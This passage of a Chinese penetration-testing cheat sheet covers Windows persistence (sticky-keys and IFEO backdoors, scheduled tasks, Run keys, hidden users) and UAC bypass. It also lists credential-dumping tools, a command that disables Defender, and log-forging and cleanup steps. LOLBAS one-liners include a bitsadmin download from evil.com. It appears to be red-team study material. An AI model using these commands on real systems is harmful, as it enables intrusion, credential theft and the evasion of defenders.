&lt;li&gt;利用 NTFS ADS (Alternate　Data　Streams) 创建隐藏文件&lt;/li&gt;
&lt;li&gt;利用 Windows 保留字
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;aux|prn|con|nul|com1|com2|com3|com4|com5|com6|com7|com8|com9|lpt1|lpt2|lpt3|lpt4|lpt5|lpt6|lpt7|lpt8|lpt9&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;后门&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#后门&#34;&gt;#&lt;/a&gt; 后门&lt;/h2&gt;
&lt;h3 id=&#34;sethc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sethc&#34;&gt;#&lt;/a&gt; sethc&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;sethc.exe&lt;/code&gt;  是 Windows 系统在用户按下五次 shift 后调用的粘滞键处理程序，当有写文件但是没有执行权限时，可以通过替换  &lt;code&gt;sethc.exe&lt;/code&gt;  的方式留下后门，在密码输入页面输入五次 shift 即可获得权限。&lt;/p&gt;
&lt;h3 id=&#34;映像劫持&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#映像劫持&#34;&gt;#&lt;/a&gt; 映像劫持&lt;/h3&gt;
&lt;p&gt;在高版本的 Windows 中，替换程序是受到系统保护的，需要使用其他的技巧来实现替换。&lt;/p&gt;
&lt;p&gt;具体操作为在注册表的  &lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Option&lt;/code&gt;  下添加项  &lt;code&gt;sethc.exe&lt;/code&gt;  ，然后在  &lt;code&gt;sethc.exe&lt;/code&gt;  这个项中添加  &lt;code&gt;debugger&lt;/code&gt;  键，键值为恶意程序的路径。&lt;/p&gt;
&lt;h3 id=&#34;定时任务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#定时任务&#34;&gt;#&lt;/a&gt; 定时任务&lt;/h3&gt;
&lt;p&gt;Windows 下有  &lt;code&gt;schtasks&lt;/code&gt;  和  &lt;code&gt;at&lt;/code&gt;  两种计划任务机制。 其中  &lt;code&gt;at&lt;/code&gt;  在较高版本的 Windows 中已经弃用。&lt;/p&gt;
&lt;p&gt;设置命令为  &lt;code&gt;schtasks /create /tn &amp;quot;TEST_OnLogon&amp;quot; /sc onlogon /tr &amp;quot;cmd.exe /c calc.exe&amp;quot;&lt;/code&gt;  、  &lt;code&gt;schtasks /create /tn &amp;quot;TEST_OnStartup&amp;quot; /sc onstart /ru system /tr &amp;quot;cmd.exe /c calc.exe&amp;quot;&lt;/code&gt;  。删除命令为  &lt;code&gt;schtasks /delete /tn &amp;quot;TEST_OnLogon&amp;quot; /f&lt;/code&gt;  。&lt;/p&gt;
&lt;h3 id=&#34;登录脚本&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#登录脚本&#34;&gt;#&lt;/a&gt; 登录脚本&lt;/h3&gt;
&lt;p&gt;Windows 可以在用户登录前执行脚本，使用  &lt;code&gt;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit&lt;/code&gt;  设置。&lt;/p&gt;
&lt;p&gt;也可在  &lt;code&gt;HKCU\Environment\&lt;/code&gt;  路径下设置  &lt;code&gt;UserInitMprLogonScript&lt;/code&gt;  来实现。&lt;/p&gt;
&lt;h3 id=&#34;屏幕保护程序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#屏幕保护程序&#34;&gt;#&lt;/a&gt; 屏幕保护程序&lt;/h3&gt;
&lt;p&gt;Windows 可以自定义屏幕保护程序，使用  &lt;code&gt;HKEY_CURRENT_USER\Control Panel\Desktop&lt;/code&gt;  设置。&lt;/p&gt;
&lt;h3 id=&#34;隐藏用户&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#隐藏用户&#34;&gt;#&lt;/a&gt; 隐藏用户&lt;/h3&gt;
&lt;p&gt;Windows 可以使用在用户名后加入  &lt;code&gt;$&lt;/code&gt;  来创建隐藏用户，这种帐户可在一定条件下隐藏，但是仍可以通过控制面板查看。&lt;/p&gt;
&lt;p&gt;在创建隐藏用户的基础上，可以修改注册表的方式创建影子用户，这种方式创建的用户只能通过注册表查看。&lt;/p&gt;
&lt;h3 id=&#34;clr&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#clr&#34;&gt;#&lt;/a&gt; CLR&lt;/h3&gt;
&lt;p&gt;CLR (Common Language Runtime Compilation) 公共语言运行时，是微软为.NET 产品构建的运行环境，可以粗略地理解为.NET 虚拟机。&lt;/p&gt;
&lt;p&gt;.NET 程序的运行离不开 CLR，因此可以通过劫持 CLR 的方式实现后门。&lt;/p&gt;
&lt;h3 id=&#34;winlogon-helper-dll后门&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#winlogon-helper-dll后门&#34;&gt;#&lt;/a&gt; Winlogon Helper DLL 后门&lt;/h3&gt;
&lt;p&gt;Winlogon 是一个 Windows 组件，用来处理各种活动，如登录、注销、身份验证期间加载用户配置文件、关闭、锁定屏幕等。这种行为由注册表管理，该注册表定义在 Windows 登录期间启动哪些进程。所以可以依靠这个注册表来进行权限维持。&lt;/p&gt;
&lt;p&gt;注册表位置如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell&lt;/code&gt;  用于执行 exe 程序&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit&lt;/code&gt;  用于执行 exe 程序&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify&lt;/code&gt;  用于执行 dll 文件&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;自启动&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#自启动&#34;&gt;#&lt;/a&gt; 自启动&lt;/h2&gt;
&lt;h3 id=&#34;基于注册表的自启动&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于注册表的自启动&#34;&gt;#&lt;/a&gt; 基于注册表的自启动&lt;/h3&gt;
&lt;p&gt;通过在注册表中写入相应的键值可以实现程序的开机自启动，主要是  &lt;code&gt;Run&lt;/code&gt;  和  &lt;code&gt;RunOnce&lt;/code&gt;  ，其中 RunOnce 和 Run 区别在于 RunOnce 的键值只作用一次，执行完毕后会自动删除。&lt;/p&gt;
&lt;p&gt;注册表如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;基于策略的自启动注册表设置如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;设置启动文件夹注册表位置如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;设置服务启动项注册表位置如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;用户自启动位置  &lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit&lt;/code&gt;  、  &lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell&lt;/code&gt;  ，其中  &lt;code&gt;Userinit&lt;/code&gt;  键允许指定用逗号分隔的多个程序。&lt;/p&gt;
&lt;p&gt;如果用户启动了屏幕保护程序，也可以通过屏幕保护程序来启动后面，相关注册表键值为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveActive&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaverIsSecure&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveTimeOut&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE.EXE&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;基于特定目录的自启动&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于特定目录的自启动&#34;&gt;#&lt;/a&gt; 基于特定目录的自启动&lt;/h3&gt;
&lt;p&gt;自启动目录，  &lt;code&gt;C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&lt;/code&gt;  目录对特定用户生效，  &lt;code&gt;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp&lt;/code&gt;  对所有用户生效。在 NT6 以前，两个目录为  &lt;code&gt;C:\Documents and Settings\Username\Start Menu\Programs\StartUp&lt;/code&gt;  /  &lt;code&gt;C:\Documents and Settings\All Users\Start Menu\Programs\StartUp&lt;/code&gt;  。&lt;/p&gt;
&lt;h1 id=&#34;权限&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#权限&#34;&gt;#&lt;/a&gt; 权限&lt;/h1&gt;
&lt;h2 id=&#34;uac&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#uac&#34;&gt;#&lt;/a&gt; UAC&lt;/h2&gt;
&lt;h3 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h3&gt;
&lt;p&gt;UAC (User Account Control) 是 Windows Vista 和 Windows Server 2008 引入的一个安全机制，当一些敏感操作发生时，会跳出提示显式要求系统权限。&lt;/p&gt;
&lt;p&gt;当用户登陆 Windows 时，每个用户都会被授予一个 access token，这个 token 中有 security identifier (SID) 的信息，决定了用户的权限。&lt;/p&gt;
&lt;h3 id=&#34;会触发uac的操作&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#会触发uac的操作&#34;&gt;#&lt;/a&gt; 会触发 UAC 的操作&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;以管理员权限启动应用&lt;/li&gt;
&lt;li&gt;修改系统、UAC 设置&lt;/li&gt;
&lt;li&gt;修改没有权限的文件或者目录（ % SystemRoot% / % ProgramFiles% 等 ）&lt;/li&gt;
&lt;li&gt;修改 ACL (access control list)&lt;/li&gt;
&lt;li&gt;安装驱动&lt;/li&gt;
&lt;li&gt;增删账户，修改账户类型，激活来宾账户&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;bypass&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bypass&#34;&gt;#&lt;/a&gt; ByPass&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;DLL 相关&lt;/li&gt;
&lt;li&gt;进程注入&lt;/li&gt;
&lt;li&gt;注册表&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;权限提升&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#权限提升&#34;&gt;#&lt;/a&gt; 权限提升&lt;/h2&gt;
&lt;p&gt;权限提升有多重方式，有利用二进制漏洞、逻辑漏洞等技巧。利用二进制漏洞获取权限的方式是利用运行在内核态中的漏洞来执行代码。比如内核、驱动中的 UAF 或者其他类似的漏洞，以获得较高的权限。&lt;/p&gt;
&lt;p&gt;逻辑漏洞主要是利用系统的一些逻辑存在问题的机制，比如有些文件夹用户可以写入，但是会以管理员权限启动。&lt;/p&gt;
&lt;h3 id=&#34;任意写文件利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#任意写文件利用&#34;&gt;#&lt;/a&gt; 任意写文件利用&lt;/h3&gt;
&lt;p&gt;在 Windows 中用户可以写的敏感位置主要有以下这些&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户自身的文件和目录，包括  &lt;code&gt;AppData&lt;/code&gt;   &lt;code&gt;Temp&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;C:\&lt;/code&gt;  ，默认情况下用户可以写入&lt;/li&gt;
&lt;li&gt;&lt;code&gt;C:\ProgramData&lt;/code&gt;  的子目录，默认情况下用户可以创建文件夹、写入文件&lt;/li&gt;
&lt;li&gt;&lt;code&gt;C:\Windows\Temp&lt;/code&gt;  的子目录，默认情况下用户可以创建文件夹、写入文件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;具体的 ACL 信息可用 AccessChk, 或者 PowerShell 的  &lt;code&gt;Get-Acl&lt;/code&gt;  命令查看。&lt;/p&gt;
&lt;p&gt;可以利用对这些文件夹及其子目录的写权限，写入一些可能会被加载的 dll，利用 dll 的加载执行来获取权限。&lt;/p&gt;
&lt;h3 id=&#34;mof&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mof&#34;&gt;#&lt;/a&gt; MOF&lt;/h3&gt;
&lt;p&gt;MOF 是 Windows 系统的一个文件（  &lt;code&gt;c:/windows/system32/wbem/mof/nullevt.mof&lt;/code&gt;  ）叫做 &amp;quot;托管对象格式&amp;quot;，其作用是每隔五秒就会去监控进程创建和死亡。&lt;/p&gt;
&lt;p&gt;当拥有文件上传的权限但是没有 Shell 时，可以上传定制的 mof 文件至相应的位置，一定时间后这个 mof 就会被执行。&lt;/p&gt;
&lt;p&gt;一般会采用在 mof 中加入一段添加管理员用户的命令的 vbs 脚本，当执行后就拥有了新的管理员账户。&lt;/p&gt;
&lt;h3 id=&#34;凭证窃取&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#凭证窃取&#34;&gt;#&lt;/a&gt; 凭证窃取&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Windows 本地密码散列导出工具
&lt;ul&gt;
&lt;li&gt;mimikatz&lt;/li&gt;
&lt;li&gt;lsass&lt;/li&gt;
&lt;li&gt;wce&lt;/li&gt;
&lt;li&gt;gsecdump&lt;/li&gt;
&lt;li&gt;copypwd&lt;/li&gt;
&lt;li&gt;Pwdump&lt;/li&gt;
&lt;li&gt;ProcDump：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvc3lzaW50ZXJuYWxzL2Rvd25sb2Fkcy9wcm9jZHVtcA==&#34;&gt;https://docs.microsoft.com/en-us/sysinternals/downloads/procdump&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Windows 本地密码破解工具
&lt;ul&gt;
&lt;li&gt;L0phtCrack&lt;/li&gt;
&lt;li&gt;SAMInside&lt;/li&gt;
&lt;li&gt;Ophcrack&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;彩虹表破解&lt;/li&gt;
&lt;li&gt;本机 hash + 明文抓取&lt;/li&gt;
&lt;li&gt;win8+win2012 明文抓取&lt;/li&gt;
&lt;li&gt;ntds.dit 的导出 + QuarkPwDump 读取分析&lt;/li&gt;
&lt;li&gt;vssown.vbs + libesedb + NtdsXtract&lt;/li&gt;
&lt;li&gt;ntdsdump&lt;/li&gt;
&lt;li&gt;利用 powershell (DSInternals) 分析 hash&lt;/li&gt;
&lt;li&gt;使用  &lt;code&gt;net use \\%computername% /u:%username%&lt;/code&gt;  重置密码尝试次数&lt;/li&gt;
&lt;li&gt;限制读取时，可 crash 操作系统后，在蓝屏的 dump 文件中读取&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;其他-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他-2&#34;&gt;#&lt;/a&gt; 其他&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;组策略首选项漏洞&lt;/li&gt;
&lt;li&gt;DLL 劫持&lt;/li&gt;
&lt;li&gt;替换系统工具，实现后门&lt;/li&gt;
&lt;li&gt;关闭 defender
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Set-MpPreference -disablerealtimeMonitoring $true&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;痕迹清理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#痕迹清理&#34;&gt;#&lt;/a&gt; 痕迹清理&lt;/h1&gt;
&lt;h2 id=&#34;日志&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#日志&#34;&gt;#&lt;/a&gt; 日志&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;查看日志  &lt;code&gt;eventvwr&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;伪造日志  &lt;code&gt;eventcreate&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;操作日志
&lt;ul&gt;
&lt;li&gt;3389 登录列表&lt;/li&gt;
&lt;li&gt;文件打开日志&lt;/li&gt;
&lt;li&gt;文件修改日志&lt;/li&gt;
&lt;li&gt;浏览器日志&lt;/li&gt;
&lt;li&gt;系统事件&lt;/li&gt;
&lt;li&gt;程序安装记录&lt;/li&gt;
&lt;li&gt;程序删除记录&lt;/li&gt;
&lt;li&gt;程序更新记录&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;登录日志
&lt;ul&gt;
&lt;li&gt;系统安全日志&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;日志路径
&lt;ul&gt;
&lt;li&gt;系统日志：  &lt;code&gt;%SystemRoot%\System32\Winevt\Logs\System.evtx&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;安全日志：  &lt;code&gt;%SystemRoot%\System32\Winevt\Logs\Security.evtx&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;应用程序日志：  &lt;code&gt;%SystemRoot%\System32\Winevt\Logs\Application.evtx&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;服务日志
&lt;ul&gt;
&lt;li&gt;IIS：  &lt;code&gt;%SystemDrive%\inetpub\logs\LogFiles\W3SVC1\&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;注册表&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注册表&#34;&gt;#&lt;/a&gt; 注册表&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;AppCompatFlags&lt;/li&gt;
&lt;li&gt;Background Activity Moderator (BAM)&lt;/li&gt;
&lt;li&gt;MuiCache&lt;/li&gt;
&lt;li&gt;RecentApps&lt;/li&gt;
&lt;li&gt;RunMRU&lt;/li&gt;
&lt;li&gt;ShimCache (AppCompatCache)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;注册表键&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注册表键&#34;&gt;#&lt;/a&gt; 注册表键&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;HKEY_LOCAL_MACHINEsystemCurrentControlSetServicesEventlog&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件&#34;&gt;#&lt;/a&gt; 文件&lt;/h2&gt;
&lt;h3 id=&#34;prefetch&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#prefetch&#34;&gt;#&lt;/a&gt; Prefetch&lt;/h3&gt;
&lt;p&gt;预读取文件夹，用来存放系统已访问过的文件的预读信息，扩展名为 PF。位置在  &lt;code&gt;C:\Windows\Prefetch&lt;/code&gt;  。&lt;/p&gt;
&lt;h3 id=&#34;jumplists&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jumplists&#34;&gt;#&lt;/a&gt; JumpLists&lt;/h3&gt;
&lt;p&gt;记录用户最近使用的文档和应用程序，方便用户快速跳转到指定文件，位置在  &lt;code&gt;%APPDATA%\Microsoft\Windows\Recent&lt;/code&gt;  。&lt;/p&gt;
&lt;h3 id=&#34;amcache-recentfilecachebcf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#amcache-recentfilecachebcf&#34;&gt;#&lt;/a&gt; Amcache / RecentFileCache.bcf&lt;/h3&gt;
&lt;p&gt;Windows 中的使用这两个文件来跟踪具有不同可执行文件的应用程序兼容性问题，它可用于确定可执行文件首次运行的时间和最后修改时间。&lt;/p&gt;
&lt;p&gt;在 Windows 7、Windows Server 2008 R2 等系统中，文件保存在  &lt;code&gt;C:\Windows\AppCompat\Programs\RecentFileCache.bcf&lt;/code&gt;  ，包含程序的创建时间、上次修改时间、上次访问时间和文件名。&lt;/p&gt;
&lt;p&gt;在 Windows 8、Windows 10、Windows Server 2012 等系统中，文件保存在  &lt;code&gt;C:\Windows\AppCompat\Programs\Amcache.hve&lt;/code&gt;  ，包含文件大小、版本、sha1、二进制文件类型等信息。&lt;/p&gt;
&lt;h2 id=&#34;时间轴&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#时间轴&#34;&gt;#&lt;/a&gt; 时间轴&lt;/h2&gt;
&lt;p&gt;Windows 时间轴是 Windows 10 在 1803 版中引入的一个新特性，会记录访问过的网站、编辑过的文档、运行的程序等，&lt;/p&gt;
&lt;h2 id=&#34;彻底删除&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#彻底删除&#34;&gt;#&lt;/a&gt; 彻底删除&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;多次覆写文件  &lt;code&gt;cipher /w:&amp;lt;path&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;格式化某磁盘 count 次  &lt;code&gt;format D: /P:&amp;lt;count&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;横向移动&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#横向移动&#34;&gt;#&lt;/a&gt; 横向移动&lt;/h1&gt;
&lt;h2 id=&#34;常见入口&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见入口&#34;&gt;#&lt;/a&gt; 常见入口&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;SMB 弱密码&lt;/li&gt;
&lt;li&gt;SqlServer 弱密码&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;lolbas&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#lolbas&#34;&gt;#&lt;/a&gt; LOLBAS&lt;/h2&gt;
&lt;h3 id=&#34;简介-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-2&#34;&gt;#&lt;/a&gt; 简介&lt;/h3&gt;
&lt;p&gt;LOLBAS，全称 Living Off The Land Binaries and Scripts (and also Libraries)，是一种白利用方式，是在 2013 年 DerbyCon 由 Christopher Campbell 和 Matt Graeber 发现，最终 Philip Goh 提出的概念。&lt;/p&gt;
&lt;p&gt;这些程序一般有有 Microsoft 或第三方认证机构的签名，但是除了可以完成正常的功能，也能够被用于内网渗透中。这些程序可能会被用于：下载安全恶意程序、执行恶意代码、绕过 UAC、绕过程序控制等。&lt;/p&gt;
&lt;h3 id=&#34;常见程序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见程序&#34;&gt;#&lt;/a&gt; 常见程序&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;appsyncvpublishing.exe&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;执行 powershell&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;bitsadmin.exe&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;下载文件  &lt;code&gt;bitsadmin /transfer &amp;lt;job_name&amp;gt; /priority &amp;lt;priority&amp;gt; &amp;lt;remote_path&amp;gt; &amp;lt;local_path&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;下载文件  &lt;code&gt;bitsadmin /create 1 bitsadmin /addfile 1 https://evil.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;复制文件  &lt;code&gt;bitsadmin /create 1 &amp;amp; bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe &amp;amp; bitsadmin /RESUME 1 &amp;amp; bitsadmin /Complete 1 &amp;amp; bitsadmin /reset&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;代码执行  &lt;code&gt;bitsadmin /create 1 &amp;amp; bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe &amp;amp; bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL &amp;amp; bitsadmin /RESUME 1 &amp;amp; bitsadmin /Reset&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;cdb.exe&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;certutil.exe&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;可安装、备份、删除、管理和执行&lt;/li&gt;
&lt;li&gt;证书证书存储相关功能&lt;/li&gt;
&lt;li&gt;下载文件  &lt;code&gt;certutil -urlcache -split -f https://addr/example.exe&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;注意 certutil 是有 cache 的，需要显式删除&lt;/li&gt;
&lt;li&gt;base64 编解码  &lt;code&gt;certutil -encode&lt;/code&gt;  /  &lt;code&gt;certutil -decode&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;cmd.exe&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;cmstp.exe&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;control.exe&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZGVhcmJ5dGVzLmNvbS9ibG9nL3BsYXlpbmctYXJvdW5kLXdpdGgtbnNhLWhhY2tpbmctdG9vbHMv&#34;&gt;加载 dll&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;csc.exe&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;编译 C# 载荷&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;cscript.exe&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;执行脚本&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;extexport.exe&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;expand.exe&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;展开一个或多个压缩文件&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;forfiles.exe&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;mofcomp.exe&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;makecab.exe&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
